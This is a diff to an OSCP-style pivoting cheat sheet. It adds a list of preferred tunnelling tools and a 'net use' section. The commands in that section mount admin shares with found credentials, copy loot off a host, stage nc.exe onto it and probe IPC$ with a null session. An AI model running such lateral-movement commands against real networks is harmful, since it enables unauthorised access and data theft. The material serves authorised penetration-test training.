@@ -7,7 +7,9 @@
 > Terminal output is omitted; only the commands you type are captured.
 > **Placeholders** — `{{LHOST}}` your Kali IP (the box that runs the SSH/chisel/dnscat **server** side, and the target of any `-R`), `{{TARGET_IP}}` the final internal host/service you want to reach, `{{USERNAME}}`/`{{PASSWORD}}` creds for a host you can SSH into. Non-brace placeholders describe the pivot chain: `<PIVOT_IP>` = the compromised dual-homed host you already have a shell on and route *through*; `<DEEP_IP>` = a deeper host the pivot can SSH to. Ports (`4455`, `2345`, `9999`, `1080`, `8080`, `2222`…) are **arbitrary examples** — pick your own.
 
-> **⚡ Quick jump:** [The one decision](#the-one-decision--which-technique) · [SSH -L/-D/-R cheat](#ssh-forwarding-cheat-sheet) · [socat](#a2--socat-port-forward) · [ssh -L](#b1--local-l) · [ssh -D](#b2--dynamic-d-socks) · [ssh -R](#b3--remote-r) · [sshuttle](#b5--sshuttle) · [plink](#c2--plink-windows) · [netsh](#c3--netsh-windows) · [chisel](#d1--http-tunnelling-with-chisel) · [dnscat2](#d2--dns-tunnelling-with-dnscat2)
+> **🎯 Reach for these first in the OSCP:** **[chisel](#d1--http-tunnelling-with-chisel)** (reverse SOCKS, works even through egress filtering) · **[ssh -D + proxychains](#b2--dynamic--d-socks)** (whole-subnet SOCKS when you have creds) · **[ssh -L](#b1--local--l)** (one-service quick bridge) · **[sshuttle](#b5--sshuttle)** (transparent subnet routing, no proxychains). Everything else is situational.
+
+> **⚡ Quick jump:** [The one decision](#the-one-decision--which-technique) · [SSH -L/-D/-R cheat](#ssh-forwarding-cheat-sheet) · [socat](#a2--socat-port-forward) · [ssh -L](#b1--local--l) · [ssh -D](#b2--dynamic--d-socks) · [ssh -R](#b3--remote--r) · [sshuttle](#b5--sshuttle) · [ssh.exe](#c1--sshexe-windows) · [plink](#c2--plink-windows) · [netsh](#c3--netsh-windows) · [net use](#c4--net-use-reach-another-windows-boxs-shares) · [chisel](#d1--http-tunnelling-with-chisel) · [dnscat2](#d2--dns-tunnelling-with-dnscat2)
 
 ---
 
@@ -293,6 +295,41 @@ Clean up when done (portproxy + firewall rule both persist across reboots):
 netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
 netsh interface portproxy del v4tov4 listenport=2222 listenaddress=<PIVOT_IP>
 ```
+
+## C.4 — net use (reach another Windows box's shares)
+
+Often the *point* of a Windows pivot isn't a fancy tunnel — it's reaching a **deeper Windows host's
+SMB** to enumerate shares, drop tools, or read loot. If you have command execution on a Windows
+pivot that can already route to the deep host, run `net use` **directly on the pivot** — no tunnel
+needed. SMB is pinned to 445, so it does **not** port-forward cleanly; the clean move is to `net use`
+from a box that can reach the target on 445 (the pivot itself, or over an `-D`/chisel SOCKS with
+proxychains — never a plain single-port `-L`).
+
+```cmd
+:: mount a share from the pivot to the deeper Windows host, using found creds
+net use \\{{TARGET_IP}}\C$ /user:{{USERNAME}} {{PASSWORD}}
+net use \\{{TARGET_IP}}\share /user:CORP\{{USERNAME}} {{PASSWORD}}   :: domain\user form
+
+:: enumerate / read once mounted
+net use                                     :: list current mappings
+dir \\{{TARGET_IP}}\C$\Users
+copy \\{{TARGET_IP}}\C$\loot.txt .          :: pull a file
+copy nc.exe \\{{TARGET_IP}}\C$\Windows\Temp\    :: stage a tool onto the target
+
+:: null-session probe (no creds), then map to a drive letter
+net use \\{{TARGET_IP}}\IPC$ "" /user:""
+net use Z: \\{{TARGET_IP}}\share /user:{{USERNAME}} {{PASSWORD}}
+
+:: clean up the mappings you made
+net use \\{{TARGET_IP}}\C$ /delete
+net use * /delete /y                        :: drop them all
+```
+
+> Reaching it **over SOCKS**: because `net use` can't be told a custom port, proxychains a *Linux*
+> SMB client instead (`proxychains smbclient //{{TARGET_IP}}/C$ -U {{USERNAME}}`), or run the
+> `net use` from the pivot where 445 is directly reachable. From Kali, `nxc smb {{TARGET_IP}} -u
+> {{USERNAME}} -p {{PASSWORD}} --shares` through proxychains is usually the smoother path than
+> forwarding SMB.
 
 ---
 
